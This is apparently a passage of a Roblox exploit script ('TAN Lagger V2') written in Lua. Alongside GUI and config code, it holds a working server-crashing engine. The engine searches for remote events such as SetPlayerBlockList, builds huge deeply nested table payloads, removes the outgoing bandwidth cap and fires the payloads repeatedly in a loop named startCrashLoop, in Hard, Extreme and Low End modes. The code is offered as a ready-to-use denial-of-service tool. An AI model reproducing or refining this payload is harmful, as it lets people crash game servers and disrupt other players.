----------------------------------------------------------------
local canSave = (typeof(writefile) == "function") and (typeof(readfile) == "function")
local canRead = canSave and (typeof(isfile) == "function")

local Config = {}
for k, v in pairs(DEFAULTS) do Config[k] = v end

local function loadConfig()
    if not canRead then return end
    local ok, data = pcall(function()
        if not isfile(CONFIG_FILE) then return nil end
        return HttpService:JSONDecode(readfile(CONFIG_FILE))
    end)
    if ok and type(data) == "table" then
        for k, _ in pairs(DEFAULTS) do
            if data[k] ~= nil then Config[k] = data[k] end
        end
    end
end

local savePending = false
local function saveConfig()
    if not canSave or savePending then return end
    savePending = true
    task.delay(0.4, function()
        savePending = false
        pcall(function()
            writefile(CONFIG_FILE, HttpService:JSONEncode(Config))
        end)
    end)
end

loadConfig()

local function keyFromName(name)
    local ok, kc = pcall(function() return Enum.KeyCode[name] end)
    if ok and typeof(kc) == "EnumItem" then return kc end
    return Enum.KeyCode.RightShift
end

local function bgIndexFromName(name)
    for i, m in ipairs(BG_MODES) do
        if m.name == name then return i end
    end
    return 1
end

local function create(class, props, children)
    local inst = Instance.new(class)
    for k, v in pairs(props or {}) do inst[k] = v end
    for _, c in ipairs(children or {}) do c.Parent = inst end
    return inst
end

-- ============================================================
-- LAGGER ENGINE FACTORY (Hard + Extreme)
-- ============================================================
local function makeLaggerInstance(cfg, pulseInterval)
    local S = {
        cfg           = cfg,
        pulseInterval = pulseInterval or 0.6,

        enabled     = false,
        thread      = nil,

        pulseWanted = false,
        pulseThread = nil,

        cachedRemote = nil,
    }

    local function getmaxvalue(val)
        if type(val) ~= "number" then return nil end
        return 499999 / (val + 2)
    end

    local function getDirectRemote()
        local ok, result = pcall(function()
            return game.RobloxReplicatedStorage.SetPlayerBlockList
        end)
        if ok and result and (result:IsA("RemoteEvent")
            or result:IsA("UnreliableRemoteEvent")
            or result:IsA("RemoteFunction")) then
            return result
        end
        return nil
    end

    local function findRemote()
        if S.cachedRemote and S.cachedRemote.Parent then return S.cachedRemote end

        local paths = {
            function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
            function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
            function() return game:FindFirstChild("SetPlayerBlockList", true) end,
        }
        for _, pathFn in ipairs(paths) do
            local ok, result = pcall(pathFn)
            if ok and result and (result:IsA("RemoteEvent")
                or result:IsA("UnreliableRemoteEvent")
                or result:IsA("RemoteFunction")) then
                S.cachedRemote = result
                return result
            end
        end

        local services = { ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage") }
        for _, service in ipairs(services) do
            if service then
                for _, obj in ipairs(service:GetDescendants()) do
                    if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
                        local name = obj.Name:lower()
                        if name:find("block") or name:find("steal") or name:find("accept")
                            or name:find("report") or name:find("player") then
                            S.cachedRemote = obj
                            return obj
                        end
                    end
                end
            end
        end

        for _, service in ipairs(services) do
            if service then
                for _, obj in ipairs(service:GetDescendants()) do
                    if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
                        S.cachedRemote = obj
                        return obj
                    end
                end
            end
        end

        return nil
    end

    local function getRemote()
        local direct = getDirectRemote()
        if direct then return direct end
        return findRemote()
    end

    local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        table.insert(spammedtable, {})
        local z = spammedtable[1]
        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end

        local maximum = getmaxvalue(tableincrease) or 9999999
        for i = 1, maximum do
            table.insert(maintable, spammedtable)
            if i % 10000 == 0 then task.wait() end
        end

        local remote = getRemote()
        if remote then
            for i = 1, tries do
                local ok, err = pcall(function()
                    if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                        remote:FireServer(maintable)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(maintable)
                    end
                end)
                if not ok then
                    warn("[TAN Lagger V2] Remote call failed: " .. tostring(err))
                    S.cachedRemote = nil
                end
            end
        else
            warn("[TAN Lagger V2] No remote found!")
        end
    end

    local function startCrashLoop()
        while S.enabled do
            pcall(function()
                NetworkClient:SetOutgoingKBPSLimit(math.huge)
            end)

            pcall(function()
                settings().Network.IncomingReplicationLag = 0
            end)

            bomb(S.cfg.tableInc, S.cfg.tries)

            pcall(function()
                for i = 1, 50 do
                    game:GetService("Stats"):Get("Network.ServerStatsItem")
                end
            end)

            task.wait(S.cfg.waitTime)
        end
    end

    local function pulseTick(on)
        if on then
            if not S.enabled then
                S.enabled = true
                if not S.thread then
                    S.thread = coroutine.create(startCrashLoop)
                    coroutine.resume(S.thread)
                end
            end
        else
            if S.enabled then
                S.enabled = false
                if S.thread then
                    pcall(function() coroutine.close(S.thread) end)
                    S.thread = nil
                end
            end
        end
    end

    function S:start()
        if self.pulseThread then return end
        self.pulseWanted = true
        self.pulseThread = task.spawn(function()
            while self.pulseWanted do
                pulseTick(true)
                task.wait(self.pulseInterval)
                if not self.pulseWanted then break end
                pulseTick(false)
                task.wait(self.pulseInterval)
            end
            pulseTick(false)
            self.pulseThread = nil
        end)
    end

    function S:stop()
        self.pulseWanted = false
    end

    return S
end

----------------------------------------------------------------
-- LOW END MODE
----------------------------------------------------------------
local lowCfg = {
    POWER    = 97000,
    DEPTH    = 180,
    INTERVAL = 0.6,
}

local lowActive       = false
local lowThread       = nil
local lowCachedRemote = nil

local function buildLowPayload(power)
    local maintable    = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, lowCfg.DEPTH do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local maxRep = math.floor(power / (lowCfg.DEPTH + 2))
    for _ = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

local function getLowRemote()
    if lowCachedRemote and lowCachedRemote.Parent then return lowCachedRemote end
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if rrs then
        lowCachedRemote = rrs:FindFirstChild("SetPlayerBlockList")
    end
    return lowCachedRemote
end

local function fireLowOnce()
    local remote = getLowRemote()
    if not remote then return end
    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
    local payload = buildLowPayload(lowCfg.POWER)
    pcall(function() remote:FireServer(payload) end)
end

local function startLowEnd()
    if lowThread then return end
    lowActive = true
    lowThread = task.spawn(function()
        while lowActive do
            fireLowOnce()
            task.wait(lowCfg.INTERVAL)
        end
        lowThread = nil
    end)
end

local function stopLowEnd()
    lowActive = false
    if lowThread then
        pcall(task.cancel, lowThread)
        lowThread = nil
    end
end

local function stopAllModes()
    stopHardLagger()
    stopExtremeLagger()
    stopLowEnd()
end

local function startModeFor(mode)
    if mode == "Hard" then
        startHardLagger()
    elseif mode == "Extreme" then
        startExtremeLagger()
    elseif mode == "Low End" then
        startLowEnd()
    end
end

local function resolveBGView(entry)
    local size = entry.size or UDim2.fromScale(1, 1)
    local pos
    if entry.size then
        pos = UDim2.fromScale(
            (1 - entry.size.X.Scale) / 2,
            (1 - entry.size.Y.Scale) / 2
        )
    else
        pos = UDim2.fromScale(0, 0)
    end
    local scaleType = entry.scaleType or Enum.ScaleType.Crop
    return size, pos, scaleType
end

local function makeWinButton(name, symbol, xOffset, hoverColor)
    local btn = create("TextButton", {
        Name = name,
        Size = UDim2.fromOffset(24, 24),
        Position = UDim2.new(1, xOffset, 0, 0),
        BackgroundColor3 = COL.Row,
        BackgroundTransparency = 0.5,
        Text = symbol,
        Font = FONT,
        TextSize = 13,
        TextColor3 = COL.SubText,
        AutoButtonColor = false,
        ZIndex = 5,
        Parent = TitleBar,
    })
    corner(btn, 7)
    local st = stroke(btn, COL.PurpleDim, 1, 0.55)

    local INFO = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, INFO, {
            BackgroundTransparency = 0.1,
            BackgroundColor3 = hoverColor,
            TextColor3 = COL.White,
        }):Play()
        TweenService:Create(st, INFO, { Transparency = 0, Color = COL.Violet }):Play()
    end)

    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, INFO, {
            BackgroundTransparency = 0.5,
            BackgroundColor3 = COL.Row,
            TextColor3 = COL.SubText,
        }):Play()
        TweenService:Create(st, INFO, { Transparency = 0.55, Color = COL.PurpleDim }):Play()
    end)

    btn.MouseButton1Down:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), {
            Size = UDim2.fromOffset(21, 21),
            Position = UDim2.new(1, xOffset + 2, 0, 2),
        }):Play()
    end)
    btn.MouseButton1Up:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(24, 24),
            Position = UDim2.new(1, xOffset, 0, 0),
        }):Play()
    end)

    return btn
end

local function applyBG(mode, skipSave)
    State.BGMode = mode
    Config.BGMode = mode

    local entry
    for _, m in ipairs(BG_MODES) do
        if m.name == mode then entry = m break end
    end
    if not entry then entry = BG_MODES[1] end

    local size, pos, scaleType = resolveBGView(entry)

    TweenService:Create(BGImage, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        ImageTransparency = 0.65,
    }):Play()

    task.delay(0.14, function()
        BGImage.Image      = entry.asset
        BGImage.Size       = size
        BGImage.Position   = pos
        BGImage.ScaleType  = scaleType
        TweenService:Create(BGImage, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            ImageTransparency = 0.25,
        }):Play()
    end)

    BGName.Text = mode
    BGName.TextColor3 = COL.VioletLite
    TweenService:Create(BGName, TweenInfo.new(0.35), { TextColor3 = COL.White }):Play()

    if not skipSave then saveConfig() end
end

local function cycleBG(dir)
    local i = State.BGIndex + dir
    local n = #BG_MODES
    if i < 1 then i = n end
    if i > n then i = 1 end
    State.BGIndex = i
    applyBG(BG_MODES[i].name)
end

BGLeft.MouseButton1Click:Connect(function() cycleBG(-1) end)
BGRight.MouseButton1Click:Connect(function() cycleBG(1) end)

local minimized = false
local closing   = false

local ROWS = { Row1, Row2, Row3, Row4 }

local ORIG = {}
local function snapshot(obj)
    if obj:IsA("UIStroke") then
        ORIG[obj] = { Transparency = obj.Transparency }
    elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
        ORIG[obj] = {
            TextTransparency = obj.TextTransparency,
            BackgroundTransparency = obj.BackgroundTransparency,
        }
    elseif obj:IsA("Frame") or obj:IsA("ImageLabel") then
        ORIG[obj] = { BackgroundTransparency = obj.BackgroundTransparency }
    end
end

for _, row in ipairs(ROWS) do
    snapshot(row)
    for _, d in ipairs(row:GetDescendants()) do snapshot(d) end
end

local function setMinimized(on)
    if closing then return end
    minimized = on

    local info = TweenInfo.new(0.32, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

    -- usa WIDTH costante invece di AbsoluteSize.X (che su mobile è scalata)
    TweenService:Create(Main, info, {
        Size = UDim2.fromOffset(WIDTH, on and COLLAPSED_H or FULL_H)
    }):Play()

    for i, row in ipairs(ROWS) do
        local delay = on and (i - 1) * 0.03 or (#ROWS - i) * 0.03
        local rowInfo = TweenInfo.new(0.26, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, delay)

        local targets = { row }
        for _, d in ipairs(row:GetDescendants()) do targets[#targets + 1] = d end

        for _, obj in ipairs(targets) do
            local o = ORIG[obj]
            if o then
                local goal = {}
                for prop, value in pairs(o) do
                    goal[prop] = on and 1 or value
                end
                TweenService:Create(obj, rowInfo, goal):Play()
            end
        end
    end

    MinBtn.Text = on and "+" or "-"

    Config.Minimized = on
    saveConfig()
end

-- DRAG SMOOTH (mouse + touch)
----------------------------------------------------------------
do
    local dragging  = false
    local dragStart = Vector2.new()
    local startPos  = UDim2.new()
    local targetPos = Main.Position
    local SMOOTH    = 0.18

    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = input.Position
            startPos  = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            targetPos = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                Config.PosX = math.floor(Main.AbsolutePosition.X)
                Config.PosY = math.floor(Main.AbsolutePosition.Y)
                saveConfig()
            end
        end
    end)
    RunService.RenderStepped:Connect(function()
        if closing then return end
        Main.Position = Main.Position:Lerp(targetPos, SMOOTH)
    end)
end

-- ANIMAZIONE GRADIENT TITOLO
----------------------------------------------------------------
do
    local PALETTE = {
        COL.PurpleDeep,
        COL.Purple,
        COL.Violet,
        COL.VioletLite,
        COL.Violet,
        COL.Purple,
    }

    local PALETTE_SUB = {
        COL.Violet,
        COL.VioletLite,
        Color3.fromRGB(228, 205, 255),
        COL.VioletLite,
    }

    local function sampleFrom(palette, p)
        local n = #palette
        p = p % 1
        local scaled = p * n
        local i = math.floor(scaled)
        local f = scaled - i
        f = f * f * (3 - 2 * f)
        local a = palette[(i % n) + 1]
        local b = palette[((i + 1) % n) + 1]
        return a:Lerp(b, f)
    end

    local KEYS  = 12
    local SPAN  = 0.75
    local SPEED = 0.22
    local phase = 0

    local function buildSeq(palette, p, span)
        local kps = table.create(KEYS + 1)
        for i = 0, KEYS do
            local a = i / KEYS
            kps[i + 1] = ColorSequenceKeypoint.new(a, sampleFrom(palette, p + a * span))
        end
        return ColorSequence.new(kps)
    end

    local conn
    conn = RunService.RenderStepped:Connect(function(dt)
        if not Title.Parent then conn:Disconnect() return end
        phase = (phase + dt * SPEED) % 1

        TitleGrad.Color = buildSeq(PALETTE, phase, SPAN)
        SubGrad.Color   = buildSeq(PALETTE_SUB, phase + 0.18, SPAN * 0.7)
    end)
end
